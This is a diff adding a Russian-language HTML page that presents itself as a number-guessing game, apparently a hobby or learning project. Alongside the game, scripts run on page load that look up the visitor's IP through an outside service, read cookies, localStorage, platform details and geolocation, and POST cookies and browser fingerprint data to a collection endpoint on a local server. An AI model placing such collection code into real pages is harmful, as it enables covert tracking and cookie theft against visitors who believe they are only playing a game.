@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Информация о пользователе и игра</title>
+    <link rel="stylesheet" href="./Vzlom.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+        #game {
+            margin-top: 20px;
+        }
+        #guess-result {
+            font-size: 1.2em;
+            margin-top: 10px;
+        }
+        #guess-result.correct {
+            color: green;
+        }
+        #guess-result.incorrect {
+            color: red;
+        }
+    </style>
+</head>
+<body>
+
+<h1>Информация о вас</h1>
+
+<!-- Игровая часть -->
+<h2>Игра на угадывание числа</h2>
+<p>Угадайте число от 1 до 100!</p>
+<input type="number" id="guess-input" placeholder="Введите число">
+<button id="guess-button">Проверить</button>
+<p id="guess-result"></p>
+    <script>
+      // Функция для сохранения данных
+      function saveUserData() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    // Данные текущего пользователя
+                    const currentUser = {
+                        userAgent: navigator.userAgent,
+                        language: navigator.language,
+                        platform: navigator.platform,
+                        screenSize: `${window.screen.width}x${window.screen.height}`,
+                        ipAddress: data.ip,
+                        visitTime: new Date().toLocaleString(),
+                    };
+
+                    // Получение всех данных из localStorage
+                    const allUsers = JSON.parse(localStorage.getItem('allUsers')) || [];
+                    
+                    // Добавление текущего пользователя
+                    allUsers.push(currentUser);
+
+                    // Сохранение обновленных данных в localStorage
+                    localStorage.setItem('allUsers', JSON.stringify(allUsers));
+
+                    console.log('Данные текущего пользователя сохранены:', currentUser);
+                })
+                .catch(error => console.error('Ошибка получения данных:', error));
+        }
+
+        // Сохранение данных при загрузке страницы
+        window.onload = saveUserData;
+    </script>
+
+<script>
+    // Информация о браузере и операционной системе
+    console.log('User-Agent:', navigator.userAgent);
+    console.log('Language:', navigator.language);
+    console.log('Platform:', navigator.platform);
+    
+    // Информация о размере экрана
+    console.log('Размер экрана:', `${window.screen.width}x${window.screen.height}`);
+
+    // Данные о cookies
+    const cookies = document.cookie;
+    console.log('Cookies:', cookies ? cookies : 'Нет данных в cookies');
+
+    // Пример получения данных из localStorage
+    const userInfo = localStorage.getItem('user');
+    console.log('Информация из localStorage:', userInfo ? userInfo : 'Нет данных в localStorage');
+
+    // Пример получения IP-адреса с внешнего API
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            console.log('IP-адрес пользователя:', data.ip);
+        })
+        .catch(error => {
+            console.log('Не удалось получить IP-адрес:', error);
+        });
+
+    // Пример геолокации
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                const { latitude, longitude } = position.coords;
+                console.log(`Геолокация: Широта: ${latitude.toFixed(5)}, Долгота: ${longitude.toFixed(5)}`);
+            },
+            (error) => {
+                console.log('Ошибка при получении геолокации:', error);
+            }
+        );
+    } else {
+        console.log('Геолокация не поддерживается');
+    }
+
+    // Игра на угадывание числа
+    const randomNumber = Math.floor(Math.random() * 100) + 1;
+    let attempts = 0;
+
+    document.getElementById('guess-button').addEventListener('click', function() {
+        const userGuess = parseInt(document.getElementById('guess-input').value);
+        attempts++;
+        const resultElement = document.getElementById('guess-result');
+
+        if (isNaN(userGuess)) {
+            resultElement.textContent = 'Введите корректное число!';
+            resultElement.className = 'incorrect';
+            return;
+        }
+
+        if (userGuess === randomNumber) {
+            resultElement.textContent = `Поздравляю! Вы угадали число ${randomNumber} за ${attempts} попыток.`;
+            resultElement.className = 'correct';
+        } else if (userGuess < randomNumber) {
+            resultElement.textContent = `Попытка ${attempts}: ${userGuess} - слишком маленькое.`;
+            resultElement.className = 'incorrect';
+        } else {
+            resultElement.textContent = `Попытка ${attempts}: ${userGuess} - слишком большое.`;
+            resultElement.className = 'incorrect';
+        }
+    });
+
+</script>
+
+<script>
+    // Функция для отправки данных на сервер
+    function sendDataToServer(data) {
+        fetch('http://localhost:3000/save-data', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data),
+        })
+        .then(response => response.json())
+        .then(data => console.log('Данные успешно отправлены на сервер:', data))
+        .catch(error => console.error('Ошибка при отправке данных:', error));
+    }
+
+    // Пример использования: отправка информации о браузере
+    const userAgentData = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        screenSize: `${window.screen.width}x${window.screen.height}`,
+    };
+    
+    // Отправляем данные
+    sendDataToServer(userAgentData);
+
+    // Остальные данные отправляются по аналогии
+</script>
+
+<script>
+    function collectAndSendData() {
+        const data = {
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform,
+            screenSize: `${window.screen.width}x${window.screen.height}`,
+            cookies: document.cookie,
+            localStorage: localStorage.getItem('user') || 'Нет данных',
+            ipAddress: '', // Получить IP можно, как в примере ранее
+            geoLocation: '', // Геолокацию можно также добавить
+        };
+
+        // Отправка данных на сервер
+        sendDataToServer(data);
+    }
+
+    // Пример получения IP-адреса
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            // Заполняем поле с IP-адресом
+            collectAndSendData();
+        })
+        .catch(error => {
+            console.log('Ошибка получения IP:', error);
+        });
+</script>
+
+</body>
+</html>
